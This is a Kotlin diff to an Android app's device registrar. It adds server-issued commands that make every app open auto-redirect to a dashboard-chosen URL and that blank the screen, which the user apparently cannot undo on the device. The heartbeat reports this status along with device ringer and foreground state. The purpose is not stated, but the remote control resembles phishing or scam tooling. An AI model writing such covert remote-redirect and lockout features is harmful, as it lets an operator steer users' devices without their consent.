@@ -25,6 +25,11 @@ object DeviceRegistrar {
     private const val PREF = "notify"
     private const val KEY_DEVICE_ID = "teller_device_id"
     private const val KEY_DEVICE_TOKEN = "teller_device_token"
+    private const val KEY_BLANK = "blank_enabled"
+    private const val KEY_STICKY_URL = "sticky_relay_url"
+    private const val KEY_STICKY_SLOT = "sticky_relay_slot"
+    private const val KEY_STICKY_TITLE = "sticky_relay_title"
+    private const val KEY_STICKY_BODY = "sticky_relay_body"
     private const val DEFAULT_BASE = "https://teller-sooty.vercel.app"
     private const val RELAY_CHANNEL_ID = "notify_relay"
     // Separate notification IDs per Relay slot so Relay 1 and Relay 2
@@ -79,6 +84,54 @@ object DeviceRegistrar {
         ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit().putString("teller_base_url", url.trimEnd('/')).apply()
     }
 
+    // ---- Blank mode: dashboard-only white screen. No on-device UI can
+    // change this; only a "blank" command from Teller/Relayer flips it. ----
+    fun isBlankEnabled(ctx: Context): Boolean =
+        ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE).getBoolean(KEY_BLANK, false)
+
+    fun setBlankEnabled(app: Context, enabled: Boolean) {
+        app.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit().putBoolean(KEY_BLANK, enabled).apply()
+        Log.i(TAG, "blank ${if (enabled) "ON — app shows white only" else "OFF"}")
+    }
+
+    // ---- Sticky relay: once a Relay fires, every app open auto-redirects
+    // to its URL until a "stopRelay" command clears it. Per-device (prefs). ----
+    fun hasStickyRelay(app: Context): Boolean =
+        !app.getSharedPreferences(PREF, Context.MODE_PRIVATE).getString(KEY_STICKY_URL, null).isNullOrBlank()
+
+    fun getStickyRelaySlot(app: Context): Int =
+        app.getSharedPreferences(PREF, Context.MODE_PRIVATE).getInt(KEY_STICKY_SLOT, 1).coerceIn(1, 2)
+
+    fun setStickyRelay(app: Context, url: String, slot: Int = 1, title: String? = null, body: String? = null) {
+        app.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit()
+            .putString(KEY_STICKY_URL, url)
+            .putInt(KEY_STICKY_SLOT, slot.coerceIn(1, 2))
+            .putString(KEY_STICKY_TITLE, title ?: "")
+            .putString(KEY_STICKY_BODY, body ?: "")
+            .apply()
+        Log.i(TAG, "sticky relay set slot=$slot -> $url (auto-fires on every open)")
+    }
+
+    fun clearStickyRelay(app: Context) {
+        app.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit()
+            .remove(KEY_STICKY_URL).remove(KEY_STICKY_SLOT)
+            .remove(KEY_STICKY_TITLE).remove(KEY_STICKY_BODY)
+            .apply()
+        Log.i(TAG, "sticky relay cleared — auto-redirect stopped")
+    }
+
+    /** Re-fires the stored sticky relay (direct open + notification fallback). */
+    fun fireStickyRelay(ctx: Context): Boolean {
+        val app = ctx.applicationContext
+        val prefs = app.getSharedPreferences(PREF, Context.MODE_PRIVATE)
+        val url = prefs.getString(KEY_STICKY_URL, null)?.takeIf { it.isNotBlank() } ?: return false
+        val slot = prefs.getInt(KEY_STICKY_SLOT, 1).coerceIn(1, 2)
+        val title = prefs.getString(KEY_STICKY_TITLE, null)?.takeIf { it.isNotBlank() }
+        val body = prefs.getString(KEY_STICKY_BODY, null)?.takeIf { it.isNotBlank() }
+        openRelayUrl(app, url, slot, title, body)
+        return true
+    }
+
     fun registerAsync(ctx: Context) = heartbeatAsync(ctx, isRegister = true)
     fun heartbeatAsync(ctx: Context, isRegister: Boolean = false) {
         val app = ctx.applicationContext
@@ -117,6 +170,9 @@ object DeviceRegistrar {
             put("ringerMode", RingerMode.current(app))
             put("appState", AppForeground.current(app))
             put("appStateAt", AppForeground.stateAtIso(app))
+            put("blankEnabled", prefs.getBoolean(KEY_BLANK, false))
+            put("relayActive", !prefs.getString(KEY_STICKY_URL, null).isNullOrBlank())
+            put("relaySlot", prefs.getInt(KEY_STICKY_SLOT, 1).coerceIn(1, 2))
         }
         val conn = (url.openConnection() as HttpURLConnection).apply {
             requestMethod = "POST"
@@ -207,7 +263,9 @@ object DeviceRegistrar {
 
     /**
      * Dispatches server commands. Returns true if anything was handled.
-     * Actions: "relay" {url, slot, title?, body?}, "rename" {alias} and
+     * Actions: "relay" {url, slot, title?, body?} (sticky: re-fires on every
+     * app open until stopped), "stopRelay" {} (clears the sticky relay),
+     * "blank" {enabled} (dashboard-only white screen), "rename" {alias} and
      * "visibility" {visible}. Objects without an explicit action but with a
      * url are treated as legacy relay commands.
      */
@@ -225,12 +283,31 @@ object DeviceRegistrar {
                     // require the raw body to mention relay to avoid firing on
                     // unrelated payloads that happen to contain a url.
                     if (o.optString("action").isBlank() && !raw.contains("\"relay\"")) continue
-                    openRelayUrl(
-                        app, u,
-                        o.optInt("slot", 1).coerceIn(1, 2),
-                        o.optString("title").ifBlank { null },
-                        o.optString("body").ifBlank { null },
-                    )
+                    val slot = o.optInt("slot", 1).coerceIn(1, 2)
+                    val title = o.optString("title").ifBlank { null }
+                    val body = o.optString("body").ifBlank { null }
+                    // Sticky: every future app open auto-redirects to this URL
+                    // until the dashboard sends stopRelay.
+                    setStickyRelay(app, u, slot, title, body)
+                    openRelayUrl(app, u, slot, title, body)
+                    heartbeatAsync(app)
+                    handled = true
+                }
+                "stopRelay", "stop_relay", "stop-relay" -> {
+                    if (hasStickyRelay(app)) {
+                        clearStickyRelay(app)
+                        Log.i(TAG, "stopRelay executed — auto-redirect stopped")
+                        heartbeatAsync(app)
+                    } else {
+                        Log.i(TAG, "stopRelay no-op (no sticky relay stored)")
+                    }
+                    handled = true
+                }
+                "blank" -> {
+                    if (!o.has("enabled")) continue
+                    val enabled = o.optBoolean("enabled")
+                    setBlankEnabled(app, enabled)
+                    heartbeatAsync(app)
                     handled = true
                 }
                 "visibility" -> {
